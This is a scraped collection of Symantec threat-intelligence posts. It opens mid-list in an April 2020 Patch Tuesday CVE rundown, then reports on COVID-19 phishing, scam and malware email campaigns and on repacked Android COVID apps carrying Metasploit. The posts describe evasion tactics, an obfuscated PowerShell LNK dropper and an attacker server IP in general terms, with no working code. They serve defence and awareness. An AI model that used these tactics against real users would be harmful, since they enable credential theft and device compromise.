SharePoint Server does not properly sanitize a specially crafted web request to an affected SharePoint server. An authenticated attacker could exploit the vulnerability by sending a specially crafted request to an affected SharePoint server. Microsoft Office SharePoint XSS Vulnerability(CVE-2020-0925)MS Rating: Important A cross-site-scripting (XSS) vulnerability exists when Microsoft SharePoint Server does not properly sanitize a specially crafted web request to an affected SharePoint server. An authenticated attacker could exploit the vulnerability by sending a specially crafted request to an affected SharePoint server. Microsoft Office SharePoint XSS Vulnerability(CVE-2020-0926)MS Rating: Important A cross-site-scripting (XSS) vulnerability exists when Microsoft SharePoint Server does not properly sanitize a specially crafted web request to an affected SharePoint server. An authenticated attacker could exploit the vulnerability by sending a specially crafted request to an affected SharePoint server. Microsoft Office SharePoint XSS Vulnerability(CVE-2020-0927)MS Rating: Important A cross-site-scripting (XSS) vulnerability exists when Microsoft SharePoint Server does not properly sanitize a specially crafted web request to an affected SharePoint server. An authenticated attacker could exploit the vulnerability by sending a specially crafted request to an affected SharePoint server. Microsoft Office SharePoint XSS Vulnerability(CVE-2020-0930)MS Rating: Important A cross-site-scripting (XSS) vulnerability exists when Microsoft SharePoint Server does not properly sanitize a specially crafted web request to an affected SharePoint server. An authenticated attacker could exploit the vulnerability by sending a specially crafted request to an affected SharePoint server. Microsoft Office SharePoint XSS Vulnerability(CVE-2020-0933)MS Rating: Important A cross-site-scripting (XSS) vulnerability exists when Microsoft SharePoint Server does not properly sanitize a specially crafted web request to an affected SharePoint server. An authenticated attacker could exploit the vulnerability by sending a specially crafted request to an affected SharePoint server. Microsoft Office SharePoint XSS Vulnerability(CVE-2020-0954)MS Rating: Moderate A cross-site-scripting (XSS) vulnerability exists when Microsoft SharePoint Server does not properly sanitize a specially crafted web request to an affected SharePoint server. An authenticated attacker could exploit the vulnerability by sending a specially crafted request to an affected SharePoint server. Microsoft Office SharePoint XSS Vulnerability(CVE-2020-0978)MS Rating: Important A cross-site-scripting (XSS) vulnerability exists when Microsoft SharePoint Server does not properly sanitize a specially crafted web request to an affected SharePoint server. An authenticated attacker could exploit the vulnerability by sending a specially crafted request to an affected SharePoint server. Microsoft SharePoint Remote Code Execution Vulnerability(CVE-2020-0920)MS Rating: Important A remote code execution vulnerability exists in Microsoft SharePoint when the software fails to check the source markup of an application package. An attacker who successfully exploited the vulnerability could run arbitrary code in the context of the SharePoint application pool and the SharePoint server farm account. Microsoft SharePoint Remote Code Execution Vulnerability(CVE-2020-0971)MS Rating: Important A remote code execution vulnerability exists in Microsoft SharePoint when the software fails to check the source markup of an application package. An attacker who successfully exploited the vulnerability could run arbitrary code in the context of the SharePoint application pool and the SharePoint server farm account. Microsoft SharePoint Spoofing Vulnerability(CVE-2020-0972)MS Rating: Important A spoofing vulnerability exists when Microsoft SharePoint Server does not properly sanitize a specially crafted web request to an affected SharePoint server. An authenticated attacker could exploit the vulnerability by sending a specially crafted request to an affected SharePoint server. Microsoft SharePoint Spoofing Vulnerability(CVE-2020-0975)MS Rating: Important A spoofing vulnerability exists when Microsoft SharePoint Server does not properly sanitize a specially crafted web request to an affected SharePoint server. An authenticated attacker could exploit the vulnerability by sending a specially crafted request to an affected SharePoint server. Microsoft SharePoint Spoofing Vulnerability(CVE-2020-0976)MS Rating: Important A spoofing vulnerability exists when Microsoft SharePoint Server does not properly sanitize a specially crafted web request to an affected SharePoint server. An authenticated attacker could exploit the vulnerability by sending a specially crafted request to an affected SharePoint server. Microsoft SharePoint Spoofing Vulnerability(CVE-2020-0977)MS Rating: Important A spoofing vulnerability exists when Microsoft SharePoint Server does not properly sanitize a specially crafted web request to an affected SharePoint server. An authenticated attacker could exploit the vulnerability by sending a specially crafted request to an affected SharePoint server. Microsoft (MAU) Office Privilege Escalation Vulnerability(CVE-2020-0984)MS Rating: Important A privilege escalation vulnerability exists when the Microsoft AutoUpdate (MAU) application for Mac improperly validates updates before executing them. An attacker who successfully exploited the vulnerability who already has the ability to execute code on a system could elevate privileges. Microsoft Office Remote Code Execution Vulnerability(CVE-2020-0991)MS Rating: Important A remote code execution vulnerability exists in Microsoft Office software when the software fails to properly handle objects in memory. An attacker who successfully exploited the vulnerability could run arbitrary code in the context of the current user. Microsoft Word Remote Code Execution Vulnerability(CVE-2020-0980)MS Rating: Important A remote code execution vulnerability exists in Microsoft Word software when it fails to properly handle objects in memory. An attacker who successfully exploited the vulnerability could use a specially crafted file to perform actions in the security context of the current user. Outlook for Android Spoofing Vulnerability(CVE-2020-0973)MS Rating: Important A cross-site-scripting (XSS) vulnerability exists when Microsoft SharePoint Server does not properly sanitize a specially crafted web request to an affected SharePoint server. An authenticated attacker could exploit the vulnerability by sending a specially crafted request to an affected SharePoint server. 3.Cumulative Security Updates for Microsoft Windows Adobe Font Manager Library Remote Code Execution Vulnerability(CVE-2020-1020)MS Rating: Critical A remote code execution vulnerability exists in Microsoft Windows when the Windows Adobe Type Manager Library improperly handles a specially-crafted multi-master font - Adobe Type 1 PostScript format. For all systems except Windows 10, an attacker who successfully exploited the vulnerability could execute code remotely. OpenType Font Parsing Remote Code Execution Vulnerability(CVE-2020-0938)MS Rating: Critical A remote code execution vulnerability exists in Microsoft Windows when the Windows Adobe Type Manager Library improperly handles specially crafted OpenType fonts. For all systems except Windows 10, an attacker who successfully exploited the vulnerability could execute code remotely. Media Foundation Memory Corruption Vulnerability(CVE-2020-0948)MS Rating: Critical A memory corruption vulnerability exists when Windows Media Foundation improperly handles objects in memory. An attacker who successfully exploited the vulnerability could install programs; view, change, or delete data; or create new accounts with full user rights. Media Foundation Memory Corruption Vulnerability(CVE-2020-0949)MS Rating: Critical A memory corruption vulnerability exists when Windows Media Foundation improperly handles objects in memory. An attacker who successfully exploited the vulnerability could install programs; view, change, or delete data; or create new accounts with full user rights. Media Foundation Memory Corruption Vulnerability(CVE-2020-0950)MS Rating: Critical A memory corruption vulnerability exists when Windows Media Foundation improperly handles objects in memory. An attacker who successfully exploited the vulnerability could install programs; view, change, or delete data; or create new accounts with full user rights. Microsoft Windows Codecs Library Remote Code Execution Vulnerability(CVE-2020-0965)MS Rating: Critical A remoted code execution vulnerability exists in the way that Microsoft Windows Codecs Library handles objects in memory. An attacker who successfully exploited this vulnerability could obtain information to further compromise the user's system. Windows Push Notification Service Privilege Escalation Vulnerability(CVE-2020-0940)MS Rating: Important A privilege escalation vulnerability exists in the way the Windows Push Notification Service handles objects in memory. An attacker who successfully exploited this vulnerability could run processes in an elevated context. Windows Push Notification Service Privilege Escalation Vulnerability(CVE-2020-1001)MS Rating: Important A privilege escalation vulnerability exists in the way the Windows Push Notification Service handles objects in memory. An attacker who successfully exploited this vulnerability could run processes in an elevated context. Windows Push Notification Service Privilege Escalation Vulnerability(CVE-2020-1006)MS Rating: Important A privilege escalation vulnerability exists in the way the Windows Push Notification Service handles objects in memory. An attacker who successfully exploited this vulnerability could run processes in an elevated context. Windows Push Notification Service Privilege Escalation Vulnerability(CVE-2020-1017)MS Rating: Important A privilege escalation vulnerability exists in the way the Windows Push Notification Service handles objects in memory. An attacker who successfully exploited this vulnerability could run processes in an elevated context. Windows Push Notification Service Information Disclosure Vulnerability(CVE-2020-1016)MS Rating: Important An information disclosure vulnerability exists when the Windows Push Notification Service improperly handles objects in memory. An attacker who successfully exploited this vulnerability could obtain information to further compromise the user's system. Windows Scheduled Task Privilege Escalation Vulnerability(CVE-2020-0936)MS Rating: Important A privilege escalation vulnerability exists when a Windows scheduled task improperly handles file redirections. An attacker who successfully exploited this vulnerability could delete a targeted file they would not have permissions to. Windows Token Security Bypass Vulnerability(CVE-2020-0981)MS Rating: Important A security bypass vulnerability exists when Windows fails to properly handle token relationships. An attacker who successfully exploited the vulnerability could allow an application with a certain integrity level to execute code at a different integrity level, leading to a sandbox escape. Windows Update Stack Privilege Escalation Vulnerability(CVE-2020-0985)MS Rating: Important A privilege escalation vulnerability exists when the Windows Update Stack fails to properly handle objects in memory. An attacker who successfully exploited this vulnerability could run arbitrary code in kernel mode. Windows Update Stack Privilege Escalation Vulnerability(CVE-2020-0996)MS Rating: Important A privilege escalation vulnerability exists when the Windows Update Stack fails to properly handle objects in memory. An attacker who successfully exploited this vulnerability could run arbitrary code in kernel mode. Connected User Experiences and Telemetry Service Privilege Escalation Vulnerability(CVE-2020-0942)MS Rating: Important A privilege escalation vulnerability exists when Connected User Experiences and Telemetry Service improperly handles file operations. An attacker who successfully exploited this vulnerability could overwrite files in arbitrary locations with elevated permissions. Connected User Experiences and Telemetry Service Privilege Escalation Vulnerability(CVE-2020-0944)MS Rating: Important A privilege escalation vulnerability exists when Connected User Experiences and Telemetry Service improperly handles file operations. An attacker who successfully exploited this vulnerability could run processes in an elevated context. DirectX Privilege Escalation Vulnerability(CVE-2020-0784)MS Rating: Important A privilege escalation vulnerability exists when DirectX improperly handles objects in memory. An attacker who successfully exploited this vulnerability could run arbitrary code in kernel mode. DirectX Privilege Escalation Vulnerability(CVE-2020-0888)MS Rating: Important A privilege escalation vulnerability exists when DirectX improperly handles objects in memory. An attacker who successfully exploited this vulnerability could run arbitrary code in kernel mode. Microsoft Windows Update Client Privilege Escalation Vulnerability(CVE-2020-1014)MS Rating: Important A privilege escalation vulnerability exists in the Microsoft Windows Update Client when it does not properly handle privileges. An attacker who successfully exploited this vulnerability could run processes in an elevated context. Media Foundation Information Disclosure Vulnerability(CVE-2020-0937)MS Rating: Important An information disclosure vulnerability exists when Media Foundation improperly handles objects in memory. An attacker who successfully exploited this vulnerability could obtain information to further compromise the user's system. Media Foundation Information Disclosure Vulnerability(CVE-2020-0939)MS Rating: Important An information disclosure vulnerability exists when Media Foundation improperly handles objects in memory. An attacker who successfully exploited this vulnerability could obtain information to further compromise the user's system. Media Foundation Information Disclosure Vulnerability(CVE-2020-0945)MS Rating: Important An information disclosure vulnerability exists when Media Foundation improperly handles objects in memory. An attacker who successfully exploited this vulnerability could obtain information to further compromise the user's system. Media Foundation Information Disclosure Vulnerability(CVE-2020-0946)MS Rating: Important An information disclosure vulnerability exists when Media Foundation improperly handles objects in memory. An attacker who successfully exploited this vulnerability could obtain information to further compromise the user's system. Media Foundation Information Disclosure Vulnerability(CVE-2020-0947)MS Rating: Important An information disclosure vulnerability exists when Media Foundation improperly handles objects in memory. An attacker who successfully exploited this vulnerability could obtain information to further compromise the user's system. Windows Delivery Optimization Service Privilege Escalation Vulnerability(CVE-2020-0983)MS Rating: Important A privilege escalation vulnerability exists when the Windows Delivery Optimization service improperly handles objects in memory. An attacker who successfully exploited this vulnerability could run arbitrary code with elevated system privileges. Windows DNS Denial of Service Vulnerability(CVE-2020-0993)MS Rating: Important A denial of service vulnerability exists in Windows DNS when it fails to properly handle queries. An attacker who successfully exploited this vulnerability could cause the DNS service to become nonresponsive. Windows Privilege Escalation Vulnerability(CVE-2020-0934)MS Rating: Important A privilege escalation vulnerability exists when the Windows WpcDesktopMonSvc improperly manages memory. To exploit this vulnerability, an attacker would first have to gain execution on the victim system. Windows Privilege Escalation Vulnerability(CVE-2020-1009)MS Rating: Important A privilege escalation vulnerability exists in the way that the Microsoft Store Install Service handles file operations in protected locations. An attacker who successfully exploited the vulnerability could execute code with elevated permissions. Windows Privilege Escalation Vulnerability(CVE-2020-1011)MS Rating: Important A privilege escalation vulnerability exists when the Windows System Assessment Tool improperly handles file operations. An attacker who successfully exploited this vulnerability could run processes in an elevated context. Windows Privilege Escalation Vulnerability(CVE-2020-1015)MS Rating: Important A privilege escalation vulnerability exists in the way that the User-Mode Power Service (UMPS) handles objects in memory. An attacker who successfully exploited the vulnerability could execute code with elevated permissions. Connected User Experiences and Telemetry Service Privilege Escalation Vulnerability(CVE-2020-1029)MS Rating: Important A privilege escalation vulnerability exists when Connected User Experiences and Telemetry Service improperly handles file operations. An attacker who successfully exploited this vulnerability could run processes in an elevated context. Windows Work Folder Service privilege Escalation Vulnerability(CVE-2020-1094)MS Rating: Important A privilege escalation vulnerability exists when the Windows Work Folder Service improperly handles file operations. An attacker who successfully exploited this vulnerability could run processes in an elevated context. Windows Denial of Service Vulnerability(CVE-2020-0794)MS Rating: Important A denial of service vulnerability exists when Windows improperly handles objects in memory. An attacker who successfully exploited the vulnerability could cause a target system to stop responding. 4.Cumulative Security Updates for Microsoft Windows Kernel Windows Kernel Privilege Escalation Vulnerability(CVE-2020-0913)MS Rating: Important A privilege escalation vulnerability exists when the Windows kernel fails to properly handle objects in memory. An attacker who successfully exploited this vulnerability could run arbitrary code in kernel mode. Windows Kernel Privilege Escalation Vulnerability(CVE-2020-1000)MS Rating: Important A privilege escalation vulnerability exists when the Windows kernel fails to properly handle objects in memory. An attacker who successfully exploited this vulnerability could run arbitrary code in kernel mode. Windows Kernel Privilege Escalation Vulnerability(CVE-2020-1003)MS Rating: Important A privilege escalation vulnerability exists when the Windows kernel fails to properly handle objects in memory. An attacker who successfully exploited this vulnerability could run arbitrary code in kernel mode. Windows Kernel Privilege Escalation Vulnerability(CVE-2020-1027)MS Rating: Important A privilege escalation vulnerability exists in the way that the Windows Kernel handles objects in memory. An attacker who successfully exploited the vulnerability could execute code with elevated permissions. Windows Kernel Information Disclosure in CPU Memory Access(CVE-2020-0955)MS Rating: Important An information disclosure vulnerability exists when certain central processing units (CPU) speculatively access memory. An attacker who successfully exploited the vulnerability could read privileged data across trust boundaries. Windows Kernel Information Disclosure Vulnerability(CVE-2020-0821)MS Rating: Important An information disclosure vulnerability exists when the Windows kernel improperly handles objects in memory. An attacker who successfully exploited this vulnerability could obtain information to further compromise the user's system. Windows Kernel Information Disclosure Vulnerability(CVE-2020-1007)MS Rating: Important An information disclosure vulnerability exists when the Windows kernel improperly handles objects in memory. An attacker who successfully exploited this vulnerability could obtain information to further compromise the user's system. Win32k Privilege Escalation Vulnerability(CVE-2020-0956)MS Rating: Important A privilege escalation vulnerability exists in Windows when the Windows kernel-mode driver fails to properly handle objects in memory. An attacker who successfully exploited this vulnerability could run arbitrary code in kernel mode. Win32k Privilege Escalation Vulnerability(CVE-2020-0957)MS Rating: Important A privilege escalation vulnerability exists in Windows when the Windows kernel-mode driver fails to properly handle objects in memory. An attacker who successfully exploited this vulnerability could run arbitrary code in kernel mode. Win32k Privilege Escalation Vulnerability(CVE-2020-0958)MS Rating: Important A privilege escalation vulnerability exists in Windows when the Windows kernel-mode driver fails to properly handle objects in memory. An attacker who successfully exploited this vulnerability could run arbitrary code in kernel mode. Win32k Information Disclosure Vulnerability(CVE-2020-0699)MS Rating: Important An information disclosure vulnerability exists when the win32k component improperly provides kernel information. An attacker who successfully exploited the vulnerability could obtain information to further compromise the user's system. Win32k Information Disclosure Vulnerability(CVE-2020-0962)MS Rating: Important An information disclosure vulnerability exists when the win32k component improperly provides kernel information. An attacker who successfully exploited the vulnerability could obtain information to further compromise the user's system. 5.Cumulative Security Updates for Microsoft Graphics Component Microsoft Graphics Components Remote Code Execution Vulnerability(CVE-2020-0907)MS Rating: Critical A remote code execution vulnerability exists in the way that Microsoft Graphics Components handle objects in memory. An attacker who successfully exploited the vulnerability could execute arbitrary code on a target system. Microsoft Graphics Component Information Disclosure Vulnerability(CVE-2020-0982)MS Rating: Important An information disclosure vulnerability exists when the Microsoft Windows Graphics Component improperly handles objects in memory. An attacker who successfully exploited the vulnerability could obtain information to further compromise the user's system. Microsoft Graphics Component Information Disclosure Vulnerability(CVE-2020-0987)MS Rating: Important An information disclosure vulnerability exists when the Microsoft Windows Graphics Component improperly handles objects in memory. An attacker who successfully exploited the vulnerability could obtain information to further compromise the user's system. Microsoft Graphics Component Information Disclosure Vulnerability(CVE-2020-1005)MS Rating: Important An information disclosure vulnerability exists when the Microsoft Windows Graphics Component improperly handles objects in memory. An attacker who successfully exploited the vulnerability could obtain information to further compromise the user's system. Microsoft Graphics Remote Code Execution Vulnerability(CVE-2020-0687)MS Rating: Critical A remote code execution vulnerability exists when the Windows font library improperly handles specially crafted embedded fonts. An attacker who successfully exploited the vulnerability could take control of the affected system. GDI+ Remote Code Execution Vulnerability(CVE-2020-0964)MS Rating: Important A remote code execution vulnerability exists in the way that the Windows Graphics Device Interface (GDI) handles objects in the memory. An attacker who successfully exploited this vulnerability could take control of the affected system. Windows GDI Information Disclosure Vulnerability(CVE-2020-0952)MS Rating: Important An information disclosure vulnerability exists when the Windows GDI component improperly discloses the contents of its memory. An attacker who successfully exploited the vulnerability could obtain information to further compromise the user's system. Windows Graphics Component Privilege Escalation Vulnerability(CVE-2020-1004)MS Rating: Important A privilege escalation vulnerability exists when the Windows Graphics Component improperly handles objects in memory. An attacker who successfully exploited this vulnerability could run processes in an elevated context. 6.Cumulative Security Updates for Microsoft Jet Database Engine Jet Database Engine Remote Code Execution Vulnerability(CVE-2020-0889)MS Rating: Important A remote code execution vulnerability exists when the Windows Jet Database Engine improperly handles objects in memory. An attacker who successfully exploited this vulnerability could execute arbitrary code on a victim system. Jet Database Engine Remote Code Execution Vulnerability(CVE-2020-0953)MS Rating: Important A remote code execution vulnerability exists when the Windows Jet Database Engine improperly handles objects in memory. An attacker who successfully exploited this vulnerability could execute arbitrary code on a victim system. Jet Database Engine Remote Code Execution Vulnerability(CVE-2020-0959)MS Rating: Important A remote code execution vulnerability exists when the Windows Jet Database Engine improperly handles objects in memory. An attacker who successfully exploited this vulnerability could execute arbitrary code on a victim system. Jet Database Engine Remote Code Execution Vulnerability(CVE-2020-0960)MS Rating: Important A remote code execution vulnerability exists when the Windows Jet Database Engine improperly handles objects in memory. An attacker who successfully exploited this vulnerability could execute arbitrary code on a victim system. Jet Database Engine Remote Code Execution Vulnerability(CVE-2020-0988)MS Rating: Important A remote code execution vulnerability exists when the Windows Jet Database Engine improperly handles objects in memory. An attacker who successfully exploited this vulnerability could execute arbitrary code on a victim system. Jet Database Engine Remote Code Execution Vulnerability(CVE-2020-0992)MS Rating: Important A remote code execution vulnerability exists when the Windows Jet Database Engine improperly handles objects in memory. An attacker who successfully exploited this vulnerability could execute arbitrary code on a victim system. Jet Database Engine Remote Code Execution Vulnerability(CVE-2020-0994)MS Rating: Important A remote code execution vulnerability exists when the Windows Jet Database Engine improperly handles objects in memory. An attacker who successfully exploited this vulnerability could execute arbitrary code on a victim system. Jet Database Engine Remote Code Execution Vulnerability(CVE-2020-0995)MS Rating: Important A remote code execution vulnerability exists when the Windows Jet Database Engine improperly handles objects in memory. An attacker who successfully exploited this vulnerability could execute arbitrary code on a victim system. Jet Database Engine Remote Code Execution Vulnerability(CVE-2020-0999)MS Rating: Important A remote code execution vulnerability exists when the Windows Jet Database Engine improperly handles objects in memory. An attacker who successfully exploited this vulnerability could execute arbitrary code on a victim system. Jet Database Engine Remote Code Execution Vulnerability(CVE-2020-1008)MS Rating: Important A remote code execution vulnerability exists when the Windows Jet Database Engine improperly handles objects in memory. An attacker who successfully exploited this vulnerability could execute arbitrary code on a victim system. 7.Cumulative Security Updates for Windows Hyper-V Windows Hyper-V Remote Code Execution Vulnerability(CVE-2020-0910)MS Rating: Critical A remote code execution vulnerability exists when Windows Hyper-V on a host server fails to properly validate input from an authenticated user on a guest operating system. To exploit the vulnerability, an attacker could run a specially crafted application on a guest operating system that could cause the Hyper-V host operating system to execute arbitrary code. Windows Hyper-V Privilege Escalation Vulnerability(CVE-2020-0917)MS Rating: Important A privilege escalation vulnerability exists when Windows Hyper-V on a host server fails to properly handle objects in memory. An attacker who successfully exploited these vulnerabilities could gain elevated privileges on a target operating system. Windows Hyper-V Privilege Escalation Vulnerability(CVE-2020-0918)MS Rating: Important A privilege escalation vulnerability exists when Windows Hyper-V on a host server fails to properly handle objects in memory. An attacker who successfully exploited these vulnerabilities could gain elevated privileges on a target operating system. 8.Cumulative Security Updates for Microsoft Visual Studio Visual Studio Extension Installer Service Privilege Escalation Vulnerability(CVE-2020-0900)MS Rating: Important A privilege escalation vulnerability exists when the Visual Studio Extension Installer Service improperly handles file operations. An attacker who successfully exploited the vulnerability could delete files in arbitrary locations with elevated permissions. Microsoft Visual Studio Privilege Escalation Vulnerability(CVE-2020-0899)MS Rating: Important A privilege escalation vulnerability exists when Microsoft Visual Studio updater service improperly handles file permissions. An attacker who successfully exploited this vulnerability could overwrite arbitrary file content in the security context of the local system. 9.Cumulative Security Updates for Microsoft Dynamics Dynamics Business Central Remote Code Execution Vulnerability(CVE-2020-1022)MS Rating: Critical An remote code execution vulnerability exists in Microsoft Dynamics Business Central. An attacker who successfully exploited this vulnerability could execute arbitrary shell commands on victim's server. Microsoft Dynamics Business Central/NAV Information Disclosure(CVE-2020-1018)MS Rating: Important An information disclosure vulnerability exists when Microsoft Dynamics Business Central/NAV on-premise does not properly hide the value of a masked field when showing the records as a chart page. The attacker who successfully exploited the vulnerability could see the information that are in a masked field. Microsoft Dynamics 365 (On-Premise) Cross Site Scripting Vulnerability(CVE-2020-1049)MS Rating: Important A cross site scripting vulnerability exists when Microsoft Dynamics 365 (on-premises) does not properly sanitize a specially crafted web request to an affected Dynamics server. An authenticated attacker could exploit the vulnerability by sending a specially crafted request to an affected Dynamics server. Microsoft Dynamics 365 (On-Premise) Cross Site Scripting Vulnerability(CVE-2020-1050)MS Rating: Important A cross site scripting vulnerability exists when Microsoft Dynamics 365 (on-premises) does not properly sanitize a specially crafted web request to an affected Dynamics server. An authenticated attacker could exploit the vulnerability by sending a specially crafted request to an affected Dynamics server. 10.Cumulative Security Updates for Microsoft Defender Microsoft Defender Privilege Escalation Vulnerability(CVE-2020-1002)MS Rating: Important A privilege escalation vulnerability exists when the MpSigStub. exe for Defender allows file deletion in arbitrary locations. Windows Defender Antimalware Platform Hard Link Privilege Escalation Vulnerability(CVE-2020-0835)MS Rating: Important A privilege escalation vulnerability exists when Windows Defender antimalware platform improperly handles hard links. An attacker who successfully exploited this vulnerability could overwrite a targeted file leading to an elevated status. 11.Cumulative Security Updates for Microsoft Remote Desktop App Microsoft Remote Desktop App for Mac Privilege Escalation Vulnerability(CVE-2020-0919)MS Rating: Important A privilege escalation vulnerability exists in Remote Desktop App for Mac in the way it allows an attacker to load unsigned binaries. An attacker could then install programs; view, change, or delete data with the logged in user's privileges. Microsoft RMS Sharing App for Mac Privilege Escalation Vulnerability(CVE-2020-1019)MS Rating: Important A privilege escalation vulnerability exists in RMS Sharing App for Mac in the way it allows an attacker to load unsigned binaries. An attacker could then install programs; view, change, or delete data with the logged in user's privileges. 12.Security Update for Microsoft YourPhone Application for Android Microsoft YourPhone Application for Android Authentication Bypass Vulnerability(CVE-2020-0943)MS Rating: Important An authentication bypass vulnerability exists in Microsoft YourPhoneCompanion application for Android, in the way the application processes notifications generated by work profiles. This could allow an unauthenticated attacker to view notifications. 13.Security Update for Microsoft MSR JavaScript Cryptography Library MSR JavaScript Cryptography Library Security Bypass Vulnerability(CVE-2020-1026)MS Rating: Important A security bypass vulnerability exists in the MSR JavaScript Cryptography Library that is caused by multiple bugs in the library's Elliptic Curve Cryptography (ECC) implementation. An attacker could potentially abuse these bugs to learn information about a server's private ECC key (a key leakage attack) or craft an invalid ECDSA signature that nevertheless passes as valid. 14.Security Update for Microsoft OneDrive for Windows OneDrive for Windows Privilege Escalation Vulnerability(CVE-2020-0935)MS Rating: Important A privilege escalation vulnerability exists when the OneDrive for Windows Desktop application improperly handles symbolic links. An attacker who successfully exploited this vulnerability could overwrite a targeted file leading to an elevated status. More information is available on Symantec's freeSecurity Centerportal and to our customers through the DeepSight Threat Management System. Preethi Koroth is a member of Symantec's Cyber Security Services organization which provides round-the-clock monitoring and protection services against cyber attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/microsoft-patch-tuesday-april-2020"
  },
  {
    "title": "covid 19 outbreak prompts opportunistic wave malicious email campaigns",
    "content": "Cyber criminals are rushing to take advantage of the COVID-19 pandemic and in recent weeks Symantec has observed dozens of new malicious email campaigns attempting to leverage public fears about the virus. The threat actors behind these campaigns have employed a range of tactics in a bid to evade detection, such as using a variety of email templates along with heavy randomization of subject lines, “From” addresses, IP addresses, and URL domains. When analyzing email campaigns from the month of March, the first wave was dominated by phishing and malspam (malware bearing) emails. However, as the month moved onwards, snowshoe spam took over as the most common form of campaign, accounting for more than 40 percent of all emails blocked by Symantec. This was following by phishing (30 percent), malspam (18 percent), and scams (9 percent). There was a sharp uptick in the number of malicious emails blocked by Symantec on March 16, with a surge of spam runs focused around selling face masks, medical equipment, immunity oil, and other products related to COVID-19 virus outbreak. Interestingly, this increase closely corresponded with the increase in the number of COVID-19 infections recorded in in Europe and the U.S. This email is crafted to appear as a message from the U.S. Centers for Disease Control and Prevention (CDC). It explains that the CDC is closely monitoring the coronavirus outbreak and has established an Incident Management System to coordinate a domestic and international public health response. The recipient is then urged to click on a link that purports to lead to a list of new cases around their city. While the domain used in text appears to be “cdcinfo.gov”, hovering the cursor over the link will reveal the real, malicious URL the link leads to: When clicked, it routes to: In this spam run, the threat actor has made use of compromised domains to construct phishing URLs and has used a particular pattern – “/owa/owa.php?e=” in the URI path. The phishing URL opens a credential stealing webpage. Another phishing campaign observed by Symantec used quite a short template to masquerade as a legitimate business email. This email urges the recipient to review coronavirus funding proposals, with “Access to View File” hyperlinking to a legitimate online document editor/viewer hosting the phishing content. The URL given in the email is as follows: When opened, the document asks the viewer to enter their credentials. The use of legitimate file storage /sharing services and online document editors/viewers has increased rapidly from 2019 onwards, with threat actors leveraging these services because most of them are free. One example of a COVID-19 themed scam campaign seen by Symantec is an email pretending to come from the World Health Organization (WHO) and appears to be a classic example of advance fee fraud. In this case, the email claims that the WHO has approved of $550,000 in funding to be distributed to 50 people in the U.S. to be used for the prevention of outbreaks of the disease. In order to receive the funds, the recipient is asked to get in touch via email with an agency in order to negotiate the transfer. In most cases, if the victim does respond, the scammers will then attempt to trick them into paying a fee in order to “release” the funds. Another scam campaign features an attempt at extortion. The sender claims to be a neighbor of the recipient and says that they have been diagnosed with COVID-19 and are expecting to die. They then threaten to infect the recipient’s home unless they pay them. A Bitcoin wallet address is provided for the recipient to pay the extortion money. The Coronavirus outbreak has also prompted a surge in demand for masks and other protective clothing. One spam campaign Symantec observed claimed to come from a surgical mask supplier in China. The sender says that COVID-19 is almost gone in their country and they can now start to sell to other countries. One of the biggest snowshoe campaigns relating to the outbreak outlandishly offered “immunity oil” which could protect people from the virus. Snowshoe campaigns are bit different than the other spam campaigns. Snowshoe distributors use a variety of originating IP addresses, domains and obfuscation in the email template in order to avoid detection. One of the peculiar characteristics of snowshoe spam runs is that they involve massive amounts of emails in short intervals of time. Threat actors also use heavy randomization in header fields in order to avoid detection. In this example, the sender claims that a particular brand of oil can help to protect people from COVID-19 infection. This statement is supported by a news article which the threat actor has provided as an image in the email. A URL embedded within this image leads to spam content hosted on cloud storage – something a growing number of spammers are doing. Threat actors also register domains on different gTLDs, which are useful to send snowshoe runs in short intervals. These recently registered domains are used both in header fields and URLs. The most abused gTLDs observed in these snowshoe campaigns are:.biz, .cf, .info, .online, .xyz. Symantec provides leading predictive filtering system focused on URLs and other email features to detect and block changes in the rapidly changing email threat landscape. This technique has also proved beneficial to detect the variation in these types of attacks. The WHO also featured in a recent malspam campaign seen by Symantec. The email mentions that new research on COVID-19 has proven to be effective and the WHO has thus decided to share a .pdf file containing information on safety measures and preventive vaccination. The email comes with an attachment named “Covid19_UPDATE.rtf.zip” Inside this compressed file is a link (LNK file) with .rtf file extension which points to powershell.exe with obfuscated data as parameters. As soon as the obfuscated content is decrypted, it constructs a URL using “TinyURL” service. This URL downloads cookies to After this, it tries to visit the following URL: On execution, these files can be expected to download malicious content on user’s computer. While there is always a need to protect your organization against malicious emails, at a time of fear and doubt, this need becomes more pronounced. Predictive filtering systems focused on URL and other email features are deployed in timely intervals to catch changes in the rapidly changing email threat landscape. With the help of predictive filtering system, threats that use email as a medium are filtered or blocked before they cause menace. This approach has also proved beneficial to detect the variation in these types of attacks and filter them down in terms of volume or scale. At Symantec, response teams strive hard to protect our customers by introducing new defense mechanisms against such challenging attacks. An array of defense mechanisms are deployed in different layers at .cloud and Symantec Mail gateway level to block similar attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/covid-19-outbreak-prompts-opportunistic-wave-malicious-email-campaigns"
  },
  {
    "title": "android apps coronavirus covid19 malicious",
    "content": "On March 26, Symantec discovered 11 Android applications that were all made to appear like they were legitimate apps related to tracking cases in the Covid-19 pandemic, but which were in fact secretly downloading a malicious payload after installation. The coronavirus pandemic is the main news story all over the world right now, with hundreds of thousands of cases and thousands of deaths. These applications were created after March 20, a time when Covid-19 was spreading widely, particularly in Europe. From the apps’ user interface (UI)(see Figure 1)we can see these apps were targeting Italy, which has the most confirmed cases of Covid-19 in Europe, though it is now closely followed by Spain. However, even though it is clear the malicious apps were targeting Italy, we did also see them installed on devices in the U.S. and France as well. All 11 of the malicious apps we discovered were repacked versions of a legitimate app,SM_Covid19 app, which “assesses the risk of transmission of the virus by monitoring the number, duration and type of contacts [people have]”. The repacked apps kept many of the features of the original app, such as collecting location and device information for Covid-19 monitoring. However, we found that the repacked apps were also injected with Metasploit, which allows for a reverse TCP connection and for various commands to be executed. The attackers can retrieve the compromised device user’s file information, SMS messages, contacts and even take screenshots of what the device is displaying. The malware used also had a malicious module added that could download any payload from the attackers’ servers. This functionality means it would be possible for the attackers to perform the same attack on all users at the same time; it also means they could use all infected devices to create a botnet, potentially to do something such as perform a distributed denial of service (DDoS) attack or similar. The malicious apps’ ability to download any payload means they could in theory be used to infect a victim’s device with ransomware, infostealers, coinminers, or any other type of malware. After decrypting the app, we were able to find the IP address of the control server. After investigating the server address, we found that the server was also located in Italy. We also discovered that the attackers also used a second server IP [87.19.73.8] for attacks. This campaign shows that even at times of great global crisis attackers will try to take advantage of popular topics in an attempt to infect victims with malware, but there are some simple steps device users can take to help protect themselves from this type of activity. Always download and install applications from official websites and app stores only. Symantec and Norton products detect the extensions as the following: 